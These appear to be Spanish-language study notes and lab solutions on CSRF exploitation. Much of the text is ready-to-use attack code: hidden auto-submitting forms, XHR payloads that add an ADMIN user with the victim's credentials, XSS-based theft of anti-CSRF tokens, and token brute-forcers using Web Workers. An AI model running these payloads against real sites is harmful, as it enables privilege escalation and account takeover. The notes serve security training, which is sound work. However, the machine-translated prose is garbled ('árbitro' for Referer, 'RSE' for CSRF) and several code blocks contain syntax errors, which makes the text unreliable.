# Cross-Site Request Forgery

* _CSRF_ o _XSRF_ ocurre cuando los desarrolladores omiten los mecanismos de prevención.
* Es el sabor más conocido de la categoría de ataque de la Cabdura de Sesiones. También pronouced Sea Surf
* http://seclists.org/bugtraq/2001/Jun/217

## Recap

* No hay nada malo en las solicitudes como requerir imágenes externas alojadas, código javascript, hoja de estilo, etc.
* La parte equivocada es cuando estas solicitudes se falsifican para enviar dinero al atacante tanto realizando acciones privilegiadas como otras operaciones maliciosas.
* Los ataques de CSRF permiten explotar la relación de confianza entre una aplicación web y las solicitudes HTTP realizadas por sus usuarios.
* Esto los obliga a realizar operaciones arbritarias en nombre del atacante

### Vulnerable

Una aplicación web es vuln para los ataques de CSRF IF:

1. Al realizar sesiones de seguimiento, la aplicación se basa tanto en mecanismos como las cookies HTTP como en la Autenticación Básica, que se inyectan automáticamente en la solicitud del navegador.
2. El atacante es capaz de determinar todos los parámetros requeridos para realizar la solicitud maliciosa.

### Para exploit:

1. Asegúrese de que la víctima tenga una sesión válida y activa cuando se ejecute la solicitud maliciosa.
2. Ser capaz de falsificar una solicitud válida en nombre de la víctima

### Vulnerable Scenarios

* Cuando la aplicación carece de defensas anti-CSRF
* Cuando la aplicación contiene mecanismos de defensa anti-CSRF débiles, tales como soluciones basadas en cookies, pantallas de confirmación, uso de POST, y la comprobación de la cabecera del árbitro.

> CSRF = un atacante puede enviar una solicitud en nombre de la víctima ht usando su navegador, lo que simplemente significa que el atacante puede dirigirse a cualquier sitio web que sea accesible desde el lado de la víctima.

## Attack Vectors

Force Browsing with GET

### Change Email Address

Digamos, proporcionar la nueva dirección y subit el formulario

* Por defecto, el método HTTP es GET
* Para explotar este vuln, necesitamos generar una petición de GET y luego engañar a la víctima (o su navegador) para ejecutarlo.

El método más sencillo para generar una petición de GET es utilizar imágenes. Esto es simplemente porque Getis el método estándar utilizado al solicitar una imagen con HTML

Para entregar el ataque, debemos explotar un defecto existente como XSS, e inyectar HTML o Javascript.

De lo contrario, necesitamos diseñar socialmente a la víctima para que visiten nuestra página maliciosa o haga clic en un enlace que proporcionamos.

Tags supported by HTML4 and HTML5

```
http://www.w3.org/TR/REC-html40/index/attributes.html
http://www.w3.org/html/wg/drafts/html/master/index.html#attributes-1
```

REQUIRE User Interaction:

```js
<href=URL>click here
<form><input formaction=URL>
<button formaction=URL>
```

DO NOT REQUIRE User Interaction:

```js
<iframe src=URL>
<script src=URL>
<input type="image" src=URL alt="">
<embed src=URL>
<audio src=URL>
<video src=URL>
<source src=URL>
<video poster=URL>
<link rel="stylesheet" href=URL>
<object data=URL>
<body background=URL>
<div style="backgound:url(URL)">
<style>body { background:url(URL) } </script>
```

## Post Requests

Utilizando sólo HTML, la única manera de falsifigar peticiones POST es con el método de atributo de tah FORM:

```js
<form action="somewhere" method="POST">
```

* Como resultado, necesitamos crear una forma clonada y luego ingeniero social la víctima para hacer clic en el botón de envío.
* Podemos usar Javascript HTML para crear un ataque más eficaz que no requiere interacción del usuario

### Auto-submitting Form

```js
<script>document.getElementById("CSRForm").submit()</script>
```

Podemos utilizar manejadores de eventos como **onload** y **onerror** porque no requieren interacción del usuario:

```js
<img src=x onerror="CSRForm.submit();">
```

en HTML5 podemos utilizar **autofocus** y el manejador de eventos relacionado **onfocus**:

```js
<input name="new" value="evil@hacker.site" autofocus onfocus="CSRForm.submit()">
```

### How to perform POST requests silently

```js
<iframe style="display:none" name="CSRFrame"></iframe>

# in the form we add target="CSRFrame" 
# display the response received submitting the form in the iframe
```

Puede forjado usando XMLHttpReques(**XHR**) también:

```js
var url="URL";
var params = "old=mycoolemail@victim.site&new=eviL@hacker.site";
var CSRF = new XMLHttpRequest();
CSRF.open("POST", url, false);
CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
CSRF.send(params)
```

También se puede hacer usando bibliotecas JavaScript como JQuery:

```js
$.ajax({ type: "POST", url: "URL", data: "old=mycoolemail@victim.site&new=eviL@hacker.site",});
```

## Exploiting Weak Anti-CSRF Measures

### Using POST-only Requests

* Obtén solicitudes en caché, marcado con marcado, etc. No debe ser utilizado Para operaciones que hacen que un estado cambie. Estos pueden incluir funcionalidades como operaciones de base de datos, archivos de escritura, etc.
* Solicitudes de POST Para información sensible es mejor práctica y protege contra una clase conocida de vectores de ataque CSRF.

### Multi-Step Transactions

* Mientras seamos capaces de predecir o deducir los pasos necesarios para completar una tarea, entonces la CSRF es posible.
* Si la aplicación implementa transacciones multi=step, estos no son en modo alguno un mecanismo de protección.

### Checking Referer Header

* Permite a un servidor comprobar dónde se orificó una solicitud y por lo tanto realizar registro, chaching optimizado, etc.
* Algunos errores de implementación son que el árbitro no se envía si el sitio web está usando SSL/TLS. Esto no tiene en cuenta que los cortafuegos, los proxies corporativos, etc., podrían quitar esta cabecera
* Puede ayudar a detectar algunos ataques. Sin embargo, no detendrá todos los ataques. Un ejemplo es un defecto XSS en el mismo origen.

### Predicatable Anti-CSRF Token

* Una de las soluciones más eficaces Para reducir la probabilidad de explotación de la RSE es utilizar un Patrón de Tokens Sincronizador, comúnmente llamado anti-CSRF Tokens.
* Este patrón de diseño requiere la generación de un token de desafío que se insertará dentro de la página HTML. Otra contramedida podría ser la galleta SameSite.

Synchronizer Token Pattern: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html

sameSite Cookie: https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7

> su esencial que los valores de token se generan al azar

### Unverified Anti-CSRF Token

Otro escenario posible es cuando la aplicación implementa fichas fuertes de Anti-CSRF, pero carece del lado del servidor de verificación.

### Secret Cookies

El concepto con esta técnica es crear una cookie que contenga información secreta (h hash de DM5 de un secreto aleatorio) y luego comprobar si está incluida en la solicitud de los usuarios.

Claramente, esto no es en modo alguno una medida de seguridad. Las cookies, tanto por especificación como por diseño, se envían con cada solicitud. Por lo tanto, una vez que un usuario establece una cookie, se pasan al sitio/app sin importar qué, independientemente de la intención del usuario.

## Advanced CSRF Exploitation

### Bypassing CSRF Defenses with XSS

Un solo defecto XSS es como una tormenta que abruma todo el sistema de protección CSRF.

> Técnicamente, una vez que hemos explotado un defecto XSS, estamos en el mismo origen de la RSE. Todas las defensas contra la CSRF, excepto los mecanismos Challenge-Respuesta, son inútiles.

Can be Bypassed:

```
- Synchronized token
- Checking the Referer Header
- Checking the Origin Header
```

→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html#synchronizer-token-pattern

→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html#verifying-origin-with-standard-headers

→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html#verifying-origin-with-standard-headers

### Bypassing Header Checks

Comprobar Referer y director de Origin simplemente significa que la solicitud debe venir de un origen apropiado.

> Eludiendo este tipo de medidas de defensas son sencillas siempre y cuando hayamos explotado eficazmente una vulnerabilidad XSS.

### Bypassing Anti-CSRF Token

Tenemos que secuestrar el token anti-csrf de una forma válida y luego usar the token stolen in nuestra forma falsificada.

```
# Once the XSS has been detected > Two scenarios:
1 - Occurs when XSS and CSRF-protected forms are contained on the same page
2 - XSS flaw is located in another part of the web application
```

Medidas para eludir los mecanismos anti-CSRF:

```
# Useless if the XSS is in the same page
- 1. Request a valid form (with a valid token)
- 2. Extract the valid token from the source code
- 3. Forge the form with the stolen token
```

## CSRF in 3 Steps

### 1 - Request a valid form with a valid Token

Necesitamos el HTML de la página donde se encuentra el formulario de destino.

* En el peor de los casos, el XSS no se encuentra en la misma página del formulario de destino de destino; por lo tanto, no podemos acceder al DOM directamente usando JavaScript. Por lo tanto, necesitamos sacar la fuente HTML de la página.
* Para obtener las páginas HTML usando XMLHttpSolicación es simple:

→ http://xhr.spec.whatwg.org/

```js
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if(xhr.readyState == 4) {
    var htmlSource = xhr.responseText; // the source code
    // some operations
  }
}
xhr.open('GET','http://victim.site/csrf-form-page.html', true);
xhr.send();
```

> El primer paso es solicitar un formulario válido con un token válido utilizando algún tipo del siguiente código JQuery:

```js
JReq = JQuery.get('http://victim.site/csrf-form-page.html', function() {
  var htmlSource = JReq.responseText; // the source code
  // some operations
  });
```

### 2 - Extract the valid Token from the Source Code

en el mejor escenario, podemos acceder fácilmente al DOM:

```js
var token = document.getElementsByName('csrf_token')[0].value
```

Mientras que, hay múltiples opciones disponibles tanto para inspeccionar el resultado de la cadena como para extraer el token anti-csrf.

Las primeras opciones es usando la API \*\*DOMParser basada en regex **DOMParser**:

```
https://developer.mozilla.org/en-US/docs/Web/API/DOMParser
```

![[Pasted image 20240311152933.png]]

### 3 - Forge the Form with the Stolen Token

Una vez que tengamos un token válido, es añadir el token anti-csrf en la forma forjado y enviar el ataque utilizando las técnicas que hemos visto en las secciones anteriores.

## Bypassing Anti-CSRF Token Brute Forcing

* Las fichas anti-csrf deben ser aleatorias e impredecibles. De lo contrario se expone a ataques de fuerza bruta.
* Si somos capaces de robar una cookie válida de vicitms, podemos utilizar **Burp Repeater** o scripts personalizados como Ruby, Python o cualquier otro mecanismo no-niño para generar un tremendo número de solicitudes.
* Además en la sección de videos

En un escenario en el que no podemos robar las galletas de la sesión de la víctima:

```
- Target users might be either convinced to visit our malicious page
- We can inject our malicious code and exploit an XSS flaw against these users.
- As a result we exploit the weak anti-CSRF protection
```

* Consideremos una implementación que genere fichas anti-CSRF con un valor numérico entre 100 y 300. Esto es un mal de azar, porque podemos forzarlo.

Explotar esto solo requiere crear una página con un script que genere y envíe 200 formularios.

```
- To submit a post we can use a form element
- XMLHttpRequest 
```

*   La implementación requiere tanto un bucle, para generar el número de solicitudes necesarias, como una función que genere las mismas solicitudes (excepto para el token anti-CSRF)

![[Pasted image 20240311153019.png]]
![](broken-reference.md)

* En algunos casos, la forma de vuln puede estar utilizando GET. Podemos usar **XHR** de nuevo; También hay una oferta de otros métodos nativos (IMG, etc.)
![[Pasted image 20240311153046.png]]
Algunas implementaciones en el mundo real de la anti-CSRF parecen utilizar una conocida solicitud del Ajax para obtener el token.

> Si u pudiera **iframe** esa funcionalidad particular, podrías reducir un token válido aprovechando JavaScript y dado que cada char tiene un tamaño diferente.

## Video's Notes

### Advanced CSRF Exploitation - parte 1

Este es un bonito sitio de compras.

```js
<script type="text/javascript">

var url = "http://targeturl.site/add_user.php";
var params = "name=Talent&surname=John&email=talent%40site.com&role=ADMIN&submit=";
# u can grab this param via BURP

var CSRF=new XMLHttpRequest();
CSRF.open("POST",url, true);
CSRF.withCredentials = "true";
CSRF.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
// u can grab the content-type via BURP
CSRF.send(params);
</script>
```

#### bypass token

```js
<script type="text/javascript">

function addUser(token)
{
  var url = "http://targeturl.site/add_user.php";
  var params = "name=Talent&surname=John&email=talent%40site.com&role=ADMIN&submit=&CSRFToken=" + token;

  var CSRF=new XMLHttpRequest();
  CSRF.open("POST",url, true);
  CSRF.withCredentials = "true";
  CSRF.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  CSRF.send(params);
}

// extract the token
var XHR = new XMLHttpRequest();
XHR.onreadystatechange = function(){
  if(XHR.readyState == 4{
    var htmlSource = XHR.reponseText; // the source of users

    // extract the token
    var parser = new DOMParser().parseFromString(htmlSource, "text/html");
    var token = parser.getElementById("CSRFToken").value;
    addUSer(token);
  }

}

XHR.open('GET', 'targeturl.site',true);
XHR.send();

</script>
```

Get token in browser

* document.getElementById('CSRFToken').value

### Advanced CSRF Exploitation - parte 2

* Envía la página sicútero en BURP a Sequencer
* Haz la prueba en vivo.
* Guarda las fichas.

in CMD:

```bash
sort <token file> // get rid of duplicates
sort <token file> | uniq -c //show the most common tokens
sort <token file> | uniq -c | nl 
sort <token file> | uniq > valid_tokens

cd /var/www
nano brutePOST.html
```

```js
<html>
<body>
  <textarea id="tokens" row="12" columns="60">
    <copy the valid tokens here>
  </textarea>

<script>
function XHRPost(tVal){
  var http = new XMLHttpRequest();
  var url = "target.site/add_user.php";
  var token = tVal;
  var params = "POST data from BURP" //edit the token in the data with the 'token' variable
  http.open("POST", url, true);
  http.withCredentials = "true";
  http.setRequestHeader("Content-Type", "content type from BURP");
  http.onreadystatechange = function(){
    if(http.readyState> 1){
      //For the SoP we dont care about response
      http.abort();

  }
  # Serialize the param object
  queryParams = Object.keys(params).reduce(functions(a,k){
    a.push(k + '=' + encodeURIComponent(params[k]));
    return a
    
  }, []).join('&');
  http.send(queryParams);
}
function bruteLoop(TList){
  For (var i=0; i<TList.length; i++){
    XHRPost(Tlist[i]);
  }
}


// Prepare the token list
var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
tokens = tokens.filter(Boolean); # remove empty values

bruteLoop (tokens);

</script>
</body>
</html>
```

#### Test the Referer value

* Prueba con subdominio
* Prueba en el texto del nombre del archivo
* En este caso, tenemos que cambiar el nombre del archivo al target.url
* Así que el árbitro puede reconocer como un remitente de confianza

### nivel 2 Brute forcer with Workers

brute.js

```js
self.addEventListener('message', function (e) {

   var tokens = e.data.tokens;

   function bruteLoop(TList) {
      for (var i = 0; i < TList.length; i++) {
         console.info("Testing: " + TList[i]);
         XHRPost(TList[i]);
      }

      Terminator();
   }

   function XHRPost(tVal) {
      var http = new XMLHttpRequest();
      var url = "http://{LABID}.csrf.labs/add_user.php";

      var token = tVal;

      params = {
         "name": "Malice",
         "surname": "Smith",
         "email": "malice@hacker.site",
         "role": "ADMIN",
         "submit": "",
         "CSRFToken": token,
      };

      http.open("POST", url, true);
      http.withCredentials = 'true';

      // Send the proper header information along with the request
      http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      http.onreadystatechange = function () {
         if (http.readyState > 1) { // We don't care about responses
            // console.warn("Aborted " + token + " with status " + http.readyState);
            // http.abort();
         }
      };

      // Serialize the data without using JQuery 
      queryParams = Object.keys(params).reduce(function (a, k) {
         a.push(k + '=' + encodeURIComponent(params[k]));
         return a
      }, []).join('&');
      http.send(queryParams);
   }

   function Terminator() {
      self.postMessage("Sir, I've finished... see you later");
      self.close();
      return;
   }

   // Brute Loop
   bruteLoop(tokens);

}, false);


```

#### Simple Brute Force

```js
<html>
   <body>
      <h1>Anti-CSRF Tokens to test</h1>
      <textarea id="tokens" rows="12" cols="60">
         1679091c5a880faf6fb5e6087eb1b2dc
      </textarea>
      <script>
         function bruteLoop(TList) {
            for (var i = 0; i < TList.length; i++) {
               console.info("Testing: " + TList[i]);
               XHRPost(TList[i]);
            }
         }

         function XHRPost(tVal) {
            var http = new XMLHttpRequest();
            var url = "http://{LABID}.csrf.labs/add_user.php";
            var token = tVal;
            params = {
               "name": "Malice",
               "surname": "Smith",
               "email": "malice@hacker.site",
               "role": "ADMIN",
               "submit": "",
               "CSRFToken": token,
            };
            http.open("POST", url, true);
            http.withCredentials = 'true';

            // Send the proper header information along with the request
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

            http.onreadystatechange = function () {
               if (http.readyState > 1) {
                  // We don't care about responses
                  // console.warn("Aborted " + token + " with status " + http.readyState);
                  http.abort();
               }
            };

            // Serialize the data without using JQuery
            queryParams = Object.keys(params).reduce(function (a, k) {
               a.push(k + '=' + encodeURIComponent(params[k]));
               return a
            }, []).join('&');
            http.send(queryParams);
         }

         var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
         tokens = tokens.filter(Boolean); // Remove empty lines

         // Brute Loop
         bruteLoop(tokens);
      </script>
   </body>
</html>


```

#### brutePOST\_worker.html

```js
<html>
   <body>
      <h1>Anti-CSRF Tokens to test</h1>
      <textarea id="tokens" rows="12" cols="60">
         00411460f7c92d2124a67ea0f4cb5f85
      </textarea>
      <br>
      <h1>Workers results</h1>
      <span id="workers"></span>

      <script>
         function startBlock(worker, tokens) {
            worker.postMessage({
               'tokens': tokens
            });
         }

         var bruterPath = "csrf.labs.bruter.js";

         var ww1 = new Worker(bruterPath);
         ww1.addEventListener('message', function (e) {
            document.getElementById("workers").innerHTML += "<b>ww1</b> says: " + e.data + "<br>";
         }, false);

         var ww2 = new Worker(bruterPath);
         ww2.addEventListener('message', function (e) {
            document.getElementById("workers").innerHTML += "<b>ww2</b> says: " + e.data + "<br>";
         }, false);

         var ww3 = new Worker(bruterPath);
         ww3.addEventListener('message', function (e) {
            document.getElementById("workers").innerHTML += "<b>ww3</b> says: " + e.data + "<br>";
         }, false);

         var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
         tokens = tokens.filter(Boolean);

         startBlock(ww1, tokens.slice(0, 333));
         startBlock(ww2, tokens.slice(333, 666));
         startBlock(ww3, tokens.slice(666, tokens.length));
      </script>

      <div>
         <img src="counter.gif" />
      </div>
   </body>
</html>
```

## LAB CSRF

### Warm-up: CSRF level 1

warm-up add the user did with BURP

### Easy: CSRF level 2

```js
<script type="text/javascript">
var url = "http://2.csrf.labs/add_user.php"
var params = "name=talent&surname=joao&email=talent%40hacker.site&role=ADMIN&submit="
var csrf = new XMLHttpRequest();
csrf.open("POST", url, true);
csrf.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
csrf.send(params);
</script>
```

### Easy: CSRF level 3

```js
test2
<script type="text/javascript">
function addUser(token) {
    var url = "http://3.csrf.labs/add_user.php";
    var param = "name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=&CSRFToken=" + token; 
    var CSRF = new XMLHttpRequest();
    CSRF.open("POST",url,true);
    CSRF.withCredentials = 'true';
    CSRF.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    CSRF.send(param);
}
// Extract the token
var XHR = new XMLHttpRequest();
XHR.onreadystatechange = function() { 
    if (XHR.readyState == 4 ) {
        var htmlSource = XHR.responseText; // the source of users.php
        // Extract the token 
        var parser = new DOMParser().parseFromString(htmlSource, "text/html");
        var token = parser.getElementById('CSRFToken').value;
        addUser(token);
    }
}
XHR.open('GET', 'http://3.csrf.labs/users.php', true);
XHR.send();
```

### Medium: CSRF level 4

> Tuvisí que cambiar el alma local en valor /etc/hosts a un subdominio del objetivo como: hacker.site.4.csrf.labs Así que el árbitro no fue bloqueado

```js
<html>
   <body>
      <h1>Anti-CSRF Tokens to test</h1>
      <textarea id="tokens" rows="12" cols="60">
         1679091c5a880faf6fb5e6087eb1b2dc
         45c48cce2e2d7fbdea1afc51c7c6ad26
         8f14e45fceea167a5a36dedd4bea2543
         a87ff679a2f3e71d9181a67b7542122c
         c4ca4238a0b923820dcc509a6f75849b
         c81e728d9d4c2f636f067f89cc14862c
         c9f0f895fb98ab9159f51fd0297e236d
         cfcd208495d565ef66e7dff9f98764da
         d3d9446802a44259755d38e6d163e820
         e4da3b7fbbce2345d7772b0674a318d5
         eccbc87e4b5ce2fe28308fd9f2a7baf3
      </textarea>
      <script>
         function bruteLoop(TList) {
            for (var i = 0; i < TList.length; i++) {
               console.info("Testing: " + TList[i]);
               XHRPost(TList[i]);
            }
         }

         function XHRPost(tVal) {
            var http = new XMLHttpRequest();
            var url = "http://4.csrf.labs/add_user.php";
            var token = tVal;
            params = {
               "name": "Johnny",
               "surname": "praq",
               "email": "john@hacker.site",
               "role": "ADMIN",
               "submit": "",
               "CSRFToken": token,
            };
            http.open("POST", url, true);
            http.withCredentials = 'true';

            // Send the proper header information along with the request
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            http.onreadystatechange = function () {
               if (http.readyState > 1) {// We don't care about responses
                  // console.warn("Aborted " + token + " with status " + http.readyState);
                  http.abort();
               }
            };

            // Serialize the data without using JQuery
            queryParams = Object.keys(params).reduce(function (a, k) {
               a.push(k + '=' + encodeURIComponent(params[k]));
               return a
            }, []).join('&');
            http.send(queryParams);
         }

         var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
         tokens = tokens.filter(Boolean); // Remove empty lines

         // Brute Loop
         bruteLoop(tokens);
      </script>
   </body>
</html>

```

### Hard: CSRF level 5

```js
<html>
   <body>
      <h1>Anti-CSRF Tokens to test</h1>
      <textarea id="tokens" rows="12" cols="60">
         00411460f7c92d2124a67ea0f4cb5f85
         # add the tokens
      </textarea>
      <br>
      <h1>Workers results</h1>
      <span id="workers"></span>

      <script>
         function startBlock(worker, tokens) {
            worker.postMessage({
               'tokens': tokens
            });
         }

         var bruterPath = "csrf.labs.bruter.js";

         var ww1 = new Worker(bruterPath);
         ww1.addEventListener('message', function (e) {
            document.getElementById("workers").innerHTML += "<b>ww1</b> says: " + e.data + "<br>";
         }, false);

         var ww2 = new Worker(bruterPath);
         ww2.addEventListener('message', function (e) {
            document.getElementById("workers").innerHTML += "<b>ww2</b> says: " + e.data + "<br>";
         }, false);

         var ww3 = new Worker(bruterPath);
         ww3.addEventListener('message', function (e) {
            document.getElementById("workers").innerHTML += "<b>ww3</b> says: " + e.data + "<br>";
         }, false);

         var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
         tokens = tokens.filter(Boolean);

         startBlock(ww1, tokens.slice(0, 333));
         startBlock(ww2, tokens.slice(333, 666));
         startBlock(ww3, tokens.slice(666, tokens.length));
      </script>

      <div>
         <img src="counter.gif" />
      </div>
   </body>
</html>

```

### JS workers

```js
self.addEventListener('message', function (e) {
   var tokens = e.data.tokens;

   function bruteLoop(TList) {
      for (var i = 0; i < TList.length; i++) {
         console.info("Testing: " + TList[i]);
         XHRPost(TList[i]);
      }
      Terminator();
   }

   function XHRPost(tVal) {
      var http = new XMLHttpRequest();
      var url = "http://5.csrf.labs/add_user.php";

      var token = tVal;

      params = {
         "name": "luffy",
         "surname": "joyboy",
         "email": "luffy@hacker.site",
         "role": "ADMIN",
         "submit": "",
         "CSRFToken": token,
      };

      http.open("POST", url, true);
      http.withCredentials = 'true';

      // Send the proper header information along with the request
      http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      http.onreadystatechange = function () {
         if (http.readyState > 1) { // We don't care about responses
            http.abort();
         }
      };

      // Serialize the data without using JQuery 
      queryParams = Object.keys(params).reduce(function (a, k) {
         a.push(k + '=' + encodeURIComponent(params[k]));
         return a
      }, []).join('&');
      http.send(queryParams);
   }

   function Terminator() {
      self.postMessage("macacos me mordam");
      self.close();
      return;
   }

   // Brute Loop
   bruteLoop(tokens);
}, false);
 
```
